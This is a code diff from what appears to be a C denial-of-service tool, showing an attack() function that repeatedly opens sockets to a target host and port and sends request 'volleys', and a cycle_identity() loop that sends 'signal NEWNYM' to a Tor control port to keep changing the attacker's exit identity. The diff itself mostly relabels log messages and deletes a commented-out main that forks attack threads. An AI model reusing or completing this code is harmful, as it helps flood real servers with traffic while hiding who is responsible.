@@ -49,7 +49,7 @@ int make_socket(char *host, char *port) {
 	if(p == NULL) {
 		if(servinfo)
 			freeaddrinfo(servinfo);
-		fprintf(stderr, "No connection could be made\n");
+		fprintf(stderr, "[err] No connection could be made\n");
 		exit(0);
 	}
 	if(servinfo)
@@ -81,9 +81,9 @@ void attack(char *host, char *port, int id) {
 				sockets[x] = make_socket(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			fprintf(stderr, "[%i: Voly Sent]\n", id);
+			fprintf(stderr, "[%i:[inf] Voly Sent]\n", id);
 		}
-		fprintf(stderr, "[%i: Voly Sent]\n", id);
+		fprintf(stderr, "[%i:[inf] Voly Sent]\n", id);
 		usleep(300000);
 	}
 }
@@ -96,23 +96,11 @@ void cycle_identity() {
 	write(socket, "AUTHENTICATE \"\"\n", 16);
 	while(1) {
 		r=write(socket, "signal NEWNYM\n\x00", 16);
-		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
+		fprintf(stderr, "[%i:[war] cycle_identity -> signal NEWNYM\n", r);
 		usleep(300000);
 	}
 }
 
-// int main(int argc, char **argv) {
-// 	int x;
-// 	if(argc !=3)
-// 		cycle_identity();
-// 	for(x=0; x != THREADS; x++) {
-// 		if(fork())
-// 			attack(argv[1], argv[2], x);
-// 		usleep(250000);
-// 	}
-// 	getc(stdin);
-// 	return 0;
-// }
 
 
 #endif
